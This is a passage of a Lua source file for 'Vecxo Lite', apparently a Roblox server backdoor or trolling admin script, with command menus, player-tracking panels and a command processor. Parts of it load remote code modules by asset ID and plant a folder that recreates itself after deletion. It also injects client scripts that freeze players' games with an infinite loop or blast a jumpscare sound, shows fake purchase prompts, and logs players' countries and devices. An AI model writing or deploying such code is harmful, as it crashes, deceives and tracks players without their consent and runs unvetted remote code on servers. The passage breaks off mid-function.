		"61 - !s <code>",
		"62 - !h <message>",
		"63 - !clr - Cleans the server of junk",
		"64 - !shutdown - Shuts the server down",
		"65 - !wls - View whitelisted users in current server",
		"66 - !plrlist - View current players in server",
		"67 - !bans - View banned players from the current server",
		"68 - !restoremap - Re-generates the KAH map",
		"69 - !hideobby - Hides the obby",
		"70 - !unhideobby - Unhides the obby",
		"71 - !unload - Unloads Vecxo Lite",
		"72 - !reloadscript - Unloads and Reloads Vecxo Lite",
		"73 - !gobby - Generates cool obby",
		"74 - !nukemap - Places tactical nukes everywhere",
		"75 - !serverprotection <true/false>",
		"76 - !antiloudnoise <true/false>",
		"77 - !cmdbar - Opens the command bar",
		"78 - !logs - Opens logs",
		"79 - !restart - Restarts the server and opens a new one"
	}

	for _, text in ipairs(commands) do
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = text
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	end

	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end

local userNameCache = {}

local function GetUserName(userId)
	if userNameCache[userId] then
		return userNameCache[userId]
	end
	local userIdNum = tonumber(userId)
	if not userIdNum then return tostring(userId) end
	for _, player in ipairs(Players:GetPlayers()) do
		if player.UserId == userIdNum then
			userNameCache[userId] = player.Name
			return player.Name
		end
	end
	local success, result = pcall(function()
		return Players:GetNameFromUserIdAsync(userIdNum)
	end)
	if success and result then
		userNameCache[userId] = result
		return result
	end

	return tostring(userId)
end

local function showWhitelisted(player, whitelistIds)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoWhitelisted")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoWhitelisted"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Whitelisted Players"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 26, 0, 26)
	closeBtn.Position = UDim2.new(1, -30, 0, 5)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local inGameWhitelist = {}

	for _, plr in ipairs(Players:GetPlayers()) do
		if table.find(whitelistIds, plr.UserId) or table.find(whitelistIds, tostring(plr.UserId)) then
			table.insert(inGameWhitelist, plr)
		end
	end

	if #inGameWhitelist == 0 then
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = "❌ No whitelisted players are currently in-game."
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	else
		for i, plr in ipairs(inGameWhitelist) do
			local entryFrame = Instance.new("Frame")
			entryFrame.Size = UDim2.new(1, -10, 0, 40) -- taller for headshot
			entryFrame.BackgroundTransparency = 1
			entryFrame.Parent = scrollingFrame

			local headshot = Instance.new("ImageLabel")
			headshot.Size = UDim2.new(0, 36, 0, 36)
			headshot.Position = UDim2.new(0, 0, 0, 2)
			headshot.BackgroundTransparency = 1
			headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. plr.UserId .. "&w=420&h=420"
			headshot.Parent = entryFrame

			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -45, 1, 0) -- leave space for headshot
			label.Position = UDim2.new(0, 40, 0, 0)
			label.BackgroundTransparency = 1
			label.Text = i .. " - [✅] " ..plr.DisplayName.."(@".. plr.Name .. ")".." - [" .. plr.UserId .. "]"
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextSize = 14
			label.Parent = entryFrame
		end
	end

	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end

local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")

local Players = game:GetService("Players")

local function showChatLogs(viewer)
	local existingGui = viewer:FindFirstChild("PlayerGui") and viewer.PlayerGui:FindFirstChild("VecxoChatLogs")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoChatLogs"
	gui.ResetOnSpawn = false
	gui.Parent = viewer:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 500, 0, 300)
	frame.Position = UDim2.new(0.5, -250, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	frame.Parent = gui

	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Chat Logs"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 26, 0, 26)
	closeBtn.Position = UDim2.new(1, -30, 0, 5)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame
	local messageCounter = 0
	local function addLabel(name, msg, userId)
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 20)
		label.BackgroundTransparency = 1

		if table.find(whitelisted, tostring(userId)) and string.find(msg, "^!") then
			label.TextColor3 = Color3.fromRGB(0, 255, 0)
		else
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
		end

		label.Text = (name.Name or name) .. ": " .. msg
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.LayoutOrder = -messageCounter
		messageCounter += 1
		label.Parent = scrollingFrame

		task.defer(function()
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end)
	end

	local connections = {}
	for i = #chatHistory, 1, -1 do
		local entry = chatHistory[i]
		addLabel(entry.Name, entry.Message, entry.UserId)
	end
	local function connectPlayer(plr)
		local conn = plr.Chatted:Connect(function(msg)
			addLabel(plr.Name, msg, plr.UserId)
		end)
		table.insert(connections, conn)
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		connectPlayer(plr)
	end
	local joinConn = Players.PlayerAdded:Connect(function(plr)
		connectPlayer(plr)
	end)
	table.insert(connections, joinConn)
	closeBtn.MouseButton1Click:Connect(function()
		for _, conn in ipairs(connections) do
			pcall(function() conn:Disconnect() end)
		end
		gui:Destroy()
	end)
	gui.AncestryChanged:Connect(function(_, parent)
		if not parent then
			for _, conn in ipairs(connections) do
				pcall(function() conn:Disconnect() end)
			end
		end
	end)
end



local function showBannedList(player, bannedPlayersTable)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoBanned")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoBanned"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Banned Players"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 26, 0, 26)
	closeBtn.Position = UDim2.new(1, -30, 0, 5)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local bannedList = {}
	for userIdStr, _ in pairs(bannedPlayersTable) do
		local userIdNum = tonumber(userIdStr)
		if userIdNum then
			table.insert(bannedList, userIdNum)
		end
	end

	if #bannedList == 0 then
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = "✅ No players are currently banned."
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	else
		for i, userId in ipairs(bannedList) do
			local name = GetUserName(userId)
			local entryFrame = Instance.new("Frame")
			entryFrame.Size = UDim2.new(1, -10, 0, 40)  -- taller for headshot and button
			entryFrame.BackgroundTransparency = 1
			entryFrame.Parent = scrollingFrame

			local headshot = Instance.new("ImageLabel")
			headshot.Size = UDim2.new(0, 36, 0, 36)
			headshot.Position = UDim2.new(0, 0, 0, 2)
			headshot.BackgroundTransparency = 1
			headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. userId .. "&w=420&h=420"
			headshot.Parent = entryFrame

			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -110, 1, 0)  
			label.Position = UDim2.new(0, 40, 0, 0)
			label.BackgroundTransparency = 1
			label.Text = i .. " - [🚫] " .. name .. " (" .. userId .. ")"
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextSize = 14
			label.Parent = entryFrame

			local unbanBtn = Instance.new("TextButton")
			unbanBtn.Size = UDim2.new(0, 60, 0, 28)
			unbanBtn.Position = UDim2.new(1, -65, 0, 6) -- right side with some margin
			unbanBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
			unbanBtn.TextColor3 = Color3.new(1, 1, 1)
			unbanBtn.Font = Enum.Font.Gotham
			unbanBtn.TextSize = 14
			unbanBtn.Text = "Unban"
			unbanBtn.Parent = entryFrame
			unbanBtn.MouseButton1Click:Connect(function()
				if bannedPlayers[userId] then
					bannedPlayers[userId] = nil
				end
				entryFrame:Destroy()
				task.defer(function()
					scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
				end)
			end)
		end
	end
	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end


local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local function GetFlag(code)
	if code:upper() == "XK" then
		return "🏳️" -- Kosovo no flag workaround
	end

	local flag = ""
	for i = 1, #code do
		flag = flag .. utf8.char(utf8.codepoint("🇦") + string.byte(code:upper():sub(i, i)) - string.byte("A"))
	end
	return flag
end

local function showPlayerList(player)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoPlayerList")
	if existingGui then
		existingGui:Destroy()
	end
	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoPlayerList"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 600, 0, 400)
	frame.Position = UDim2.new(0.5, -300, 0.5, -200)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Active = true
	frame.Draggable = true
	frame.Parent = gui
	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)
	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Player List"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame
	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 26, 0, 26)
	closeBtn.Position = UDim2.new(1, -30, 0, 5)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)
	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame
	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame
	local function addPlayerEntry(plr)
		local plrFrame = Instance.new("Frame")
		plrFrame.Size = UDim2.new(1, -10, 0, 50)
		plrFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
		plrFrame.BorderSizePixel = 0
		plrFrame.Parent = scrollingFrame
		local uicorner2 = Instance.new("UICorner", plrFrame)
		uicorner2.CornerRadius = UDim.new(0, 6)
		local headshot = Instance.new("ImageLabel")
		headshot.Size = UDim2.new(0, 40, 0, 40)
		headshot.Position = UDim2.new(0, 5, 0, 5)
		headshot.BackgroundTransparency = 1
		headshot.Name = "headshot"
		headshot.Image = "rbxthumb://type=AvatarHeadShot&id=" .. plr.UserId .. "&w=420&h=420"
		headshot.Parent = plrFrame
		local countryCode = "Unknown"
		pcall(function()
			countryCode = LocalizationService:GetCountryRegionForPlayerAsync(plr) or "Unknown"
		end)
		local flag = GetFlag(countryCode)
		local countryFull = flag .. " " .. (countries[countryCode] or countryCode)
		local isWhitelisted = table.find(whitelisted, tostring(plr.UserId)) and "✅" or "❌"
		local ping = math.floor(plr:GetNetworkPing() * 1000)
		local infoLabel = Instance.new("TextLabel")
		infoLabel.Size = UDim2.new(1, -55, 1, 0)
		infoLabel.Position = UDim2.new(0, 50, 0, 0)
		infoLabel.BackgroundTransparency = 1
		infoLabel.TextXAlignment = Enum.TextXAlignment.Left
		infoLabel.Font = Enum.Font.Gotham
		infoLabel.TextSize = 14
		infoLabel.TextColor3 = Color3.new(1, 1, 1)
		infoLabel.Text = string.format(
			"%s(@%s)\nUserId: %d | Country: %s\nWhitelisted: %s | Ping: %d ms",
			plr.DisplayName,
			plr.Name,
			plr.UserId,
			countryFull,
			isWhitelisted,
			ping
		)
		infoLabel.Parent = plrFrame
	end
	for _, plr in ipairs(Players:GetPlayers()) do
		addPlayerEntry(plr)
	end

	Players.PlayerAdded:Connect(function(plr)
		addPlayerEntry(plr)
		task.defer(function()
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end)
	end)
	Players.PlayerRemoving:Connect(function(plr)
		for _, child in ipairs(scrollingFrame:GetChildren()) do
			if child:IsA("Frame") and child:FindFirstChild("headshot") and child.headshot.Image:find(plr.UserId) then
				child:Destroy()
			end
		end
		task.defer(function()
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
		end)
	end)
	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
	task.spawn(function()
		while gui.Parent do
			for _, plrFrame in ipairs(scrollingFrame:GetChildren()) do
				if plrFrame:IsA("Frame") then
					local headshot = plrFrame:FindFirstChild("headshot")
					local infoLabel = nil
					for _, child in ipairs(plrFrame:GetChildren()) do
						if child:IsA("TextLabel") and child.Name ~= "Title" then
							infoLabel = child
							break
						end
					end
					if headshot and infoLabel then
						local userIdStr = headshot.Image:match("id=(%d+)")
						if userIdStr then
							local userIdNum = tonumber(userIdStr)
							local plr = Players:GetPlayerByUserId(userIdNum)
							if plr then
								local ping = math.floor(plr:GetNetworkPing() * 1000)
								local countryCode = "Unknown"
								pcall(function()
									countryCode = LocalizationService:GetCountryRegionForPlayerAsync(plr) or "Unknown"
								end)
								local flag = GetFlag(countryCode)
								local countryFull = flag .. " " .. (countries[countryCode] or countryCode)
								local isWhitelisted = table.find(whitelisted, tostring(plr.UserId)) and "✅" or "❌"
								infoLabel.Text = string.format(
									"%s(@%s)\nUserId: %d | Country: %s\nWhitelisted: %s | Ping: %d ms",
									plr.DisplayName,
									plr.Name,
									plr.UserId,
									countryFull,
									isWhitelisted,
									ping
								)

							end
						end
					end
				end
			end
			task.wait(5)
		end
	end)
end



vecxoconnections["Removed"] = game:GetService("ReplicatedStorage").ChildRemoved:Connect(function(t)
	if t.Name == "cxo's folder" then
		local a = Instance.new("Folder", game:GetService("ReplicatedStorage"))
		a.Name = "cxo's folder"

		task.wait(0.25)
		if not a:FindFirstChild("OrbScript") and not a:FindFirstChild("cxo's gmod remote") then
			local r = Instance.new("RemoteEvent", a)
			r.Name = "cxo's gmod remote"

			vecxoconnections["Gmod"]()

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
			local r = game:GetService("ReplicatedStorage")
			local remote = r:WaitForChild("cxo's gmod remote")
			local UserInputService = game:GetService("UserInputService")
			local Mouse = game.Players.LocalPlayer:GetMouse()

			local selected = nil
			local isgrabbed = false

			local function pickup(target)
				if target and target:IsA("BasePart") and target.Anchored == false and not isgrabbed then
					isgrabbed = true
					selected = target
					remote:FireServer("Pickup", selected)
				end
			end

			local function update(pos)
				if selected and isgrabbed then
					remote:FireServer("Update", pos)
				end
			end

			local function release()
				if selected then
					isgrabbed = false
					selected = nil
					remote:FireServer("Release")
				end
			end

			Mouse.Button1Down:Connect(function()
				local target = Mouse.Target
				pickup(target)
			end)

			Mouse.Move:Connect(function()
				if selected and isgrabbed then
					local pos = Mouse.Hit.p
					update(pos)
				end
			end)

			Mouse.Button1Up:Connect(function()
				release()
			end)

			UserInputService.TouchStarted:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.Touch then
					local target = workspace:FindPartOnRayWithIgnoreList(workspace.CurrentCamera:ScreenPointToRay(input.Position.X, input.Position.Y), {game.Players.LocalPlayer.Character})
					pickup(target)
				end
			end)

			UserInputService.TouchMoved:Connect(function(input)
				if selected and isgrabbed then
					local touchpos = input.Position
					local ray = workspace.CurrentCamera:ScreenPointToRay(touchpos.X, touchpos.Y)
					local touchpos = ray.Origin + ray.Direction * 50
					update(touchpos)
				end
			end)

			UserInputService.TouchEnded:Connect(function(input)
				release()
			end)

			]]
			scr.Parent = a
			scr.Name = "RemoteScript"
			scr.Enabled = true

			local deviceremote = Instance.new("RemoteFunction", a)
			deviceremote.Name = "cxo's Device Remote"

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[

	local UserInputService = game:GetService("UserInputService")
	local remote = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("cxo's Device Remote")

	local devices = {
		TouchEnabled = UserInputService.TouchEnabled,
		VREnabled = UserInputService.VREnabled,
		GamepadEnabled = UserInputService.GamepadEnabled,
		MouseEnabled = UserInputService.MouseEnabled,
		KeyboardEnabled = UserInputService.KeyboardEnabled
	}

	local device = ""

	if devices.VREnabled then
		device = device .. "🥽 + "
	end
	if devices.GamepadEnabled then
		device = device .. "🎮 + "
	end
	if devices.TouchEnabled then
		device = device .. "📱 + "
	end
	if devices.MouseEnabled and devices.KeyboardEnabled then
		device = device .. "⌨️🖱️ + "
	elseif devices.MouseEnabled then
		device = device .. "🖱️ + "
	elseif devices.KeyboardEnabled then
		device = device .. "⌨️ + "
	end

	if device:sub(-3) == " + " then
		device = device:sub(1, -4)
	end

	if device == "" then
		device = "❓"
	end

	if remote then
		remote:InvokeServer(device)
	end

	]]

			scr.Parent = game:GetService("ReplicatedStorage"):WaitForChild("cxo's folder")
			scr.Name = "cxo's Device LocalScript"
			scr.Enabled = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				while true do end

			]]
			scr.Parent = a
			scr.Name = "Crash"
			scr.Enabled = true

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112691275102014).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			loa.Parent = scr
			scr:WaitForChild("Exec").Value = [[
			
				local sound = Instance.new("Sound", workspace)
				sound.SoundId = "rbxassetid://17518855592"
				sound.TimePosition = 1.7
				sound.Volume = 10
				sound:Play()
				sound.Ended:Connect(function()
					sound:Destroy()
					script:Destroy()
				end)

			]]
			scr.Parent = a
			scr.Name = "JumpScareScript"
			scr.Enabled = true
		end
	end
end)

local function processCommand(sender, msg)
	if not table.find(whitelisted, tostring(sender.UserId)) then return end
	local currentToken = authTokens[sender]
	if not currentToken then
		notify(sender, "[Vecxo Lite]: ", "❌ Your current auth token for the command system does not match up with what is required, therefore the command was not sent")
		return
	end
	local function refreshToken(player)
		local newToken = generateToken()
		authTokens[player] = newToken
		TokenRemote:FireClient(player, newToken)
	end
	if table.find(whitelisted, tostring(sender.UserId)) then
		refreshToken(sender)
	end
	local args = msg:split(" ")
	local cmd = args[1]:lower()
	if cmd == "!wl" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for i, targetPlayer in ipairs(targets) do
			if not table.find(whitelisted, tostring(targetPlayer.UserId)) then
				table.insert(whitelisted, tostring(targetPlayer.UserId))
				local token = generateToken()
				authTokens[targetPlayer] = token
				TokenRemote:FireClient(targetPlayer, token)
			else
				notify(sender, "[Vecxo Lite]:", "❌ " .. targetPlayer.Name .. " is already whitelisted.")
				return
			end
			task.spawn(function()
				GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
			end)
			notify(sender, "[Vecxo Lite]:", "✅ Whitelisted " .. targetPlayer.Name)
			notifyv2(targetPlayer, "[Vecxo Lite]:", "✅ You have been whitelisted. Usage: !cmds")
		end
	elseif cmd == "!promptpurchase" and args[2] then
		local targets = GetPlayers(args[2], sender)

		local ItemIcon = args[3] or "550692424"
		local ItemPrice = args[4] or "100000"
		local ItemName = table.concat(args, " ", 5) or "🥵😈 ADIDAS (NEW) 🤑👻"

		if ItemIcon:find("rbxassetid://") then
			ItemIcon = ItemIcon:gsub("rbxassetid://", "")
		end
		ItemPrice = tostring(ItemPrice):reverse():gsub("(%d%d%d)", "%1,"):reverse():gsub("^,", ""):gsub(",+$", "")

		for i, plr in ipairs(targets) do
			task.spawn(function()
				local s, f = pcall(function()
					require(122557225201037):PurchasePromptApp(plr.Name, ItemName, ItemPrice, ItemIcon, math.random(0,999))
				end)

				if f then
					notify(sender, "[Vecxo Lite]: ", "Failed to load the fake purchaser: ".. f)
				end
			end)
		end
	elseif cmd == "!pkick" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if not _G.nanp or not _G.naned then
			require(115021406772544).r("","poto")
		end

		for i, plr in ipairs(targets) do

			if not plr.Character then
				plr:LoadCharacter()
			elseif plr.Character and not plr.Character:FindFirstChild("HumanoidRootPart") then
				plr:LoadCharacter()
			end

			if not sender.Character then
				sender:LoadCharacter()
			elseif sender.Character and not sender.Character:FindFirstChild("HumanoidRootPart") then
				sender:LoadCharacter()
			end

			if not _G.nanp then
				repeat
					task.wait()
				until _G.nanp or timeout >= 15
			end

			local begin = tick()

			_G.nanp(plr)

			if _G.naned and typeof(_G.naned) ~= "table" then -- incase sum1 nil's it
				_G.naned = {}
			end

			if _G.rworded and typeof(_G.rworded) ~= "table" then -- incase sum1 nil's it
				_G.rworded = {}
			end

			local rnpos = sender.Character.HumanoidRootPart.CFrame

			if not game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("HotPotato") then
				local success, gear = pcall(function()
					return game:GetService("InsertService"):LoadAsset(25741198)
				end)

				if success and gear then
					local potato = gear:FindFirstChildOfClass("Tool")
					if potato then
						potato:Clone().Parent = game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder")
						potato.Parent = sender.Backpack
						repeat task.wait() until potato.Parent == sender.Backpack or not game.Players:FindFirstChild(sender.Name)
